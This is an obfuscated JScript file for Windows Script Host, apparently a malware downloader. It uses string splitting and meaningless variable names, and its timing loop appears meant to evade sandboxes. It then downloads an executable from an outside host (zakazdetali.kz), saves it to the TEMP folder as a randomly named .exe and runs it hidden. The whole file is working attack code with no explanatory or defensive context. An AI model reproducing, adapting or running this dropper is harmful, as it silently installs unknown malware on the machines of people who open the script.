var _S0 = false;
var _W = "CreateObject";
var _W0 = function _Y() {return WScript[_W]("WScript"+".Shell");}(), _SY = 11;
var _RC = "MSXML2.XMLHTTP";
var _BD = 2123213;
var _L = 0;
function _KK(_P){_W0["Run"](_P, _L, _L);};
function _HD(){return _RC + "";};
function _OL(_OA, _I){_L = _L * 1; return _OA - _I;};
function _F0(){return _W;};
/*@cc_on
  @if (@_win32 || @_win64)
    _S0 = true;
  @end
@*/
if (_S0)
{
var _NO = "";
function _EG(){return 22;};
var _K = 0; var _QW = 0;
function _F()
{
var _WU = new this["Date"]();
var _Y0 = _WU["getUTCMilliseconds"]();
WScript["Sleep"](_EG());
var _WU = new this["Date"]();
var _IQ = _WU["getUTCMilliseconds"]();
WScript["Sleep"](_EG());
var _WU = new this["Date"]();
var _G = _WU["getUTCMilliseconds"]();
var _K = "_Z";
_K = _OL(_IQ, _Y0);
var _QW = "_Q";
_QW = _OL(_G, _IQ);
_NO = "open";
return _OL(_K, _QW);
}
var _K0 = false;
var _F2 = false;
for (var _F1 = _L; _F1 < _EG() * 1; _F1++){if (_F() != _L){
_K0 = true; 
_QW = "31" + 11 * _K + _QW; 
_F2 = true; 
break;
}}
function _II() {return ((_K0 == true) && (_K0 == _F2)) ? 1 : _L;};
if (_K0 && _II() && _F2){
function _M() {return _W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "b0ocahoGVM6O.ex" + "e";};
 _CE = _HD();
 _JP = WScript[_W](_CE);
 var _ZR = 1;
 while (_ZR){
try {
	if (_ZR == 1)
	{
		_JP[_NO]("GET", "http://zakazdetali.kz/v7bsad", false);
		_JP["send"]();
		_D = "Sleep";
	}
	WScript[_D](_EG() + 120); 
	if (_JP["readystate"] < 2 * 2) continue;
	_ZR = _L;
	function _S(_H) {var _O0 = (1, 2, 3, 4, 5, _H); return _O0;};
	_B = WScript[_F0()]("ADODB.Stream");
	_CE = _B;
	_CE[_NO]();
	_CE["type"] = _S(1);
	_CE["write"](_JP["ResponseBody"]);
	_B["position"] = _S(_L);
	_CE["Save" + "ToFile"](_M(), 2);
	_B["cl"+"ose"]();
	_O = _M();
	_KK(_O);
} catch(_Y1){};
}
}
}

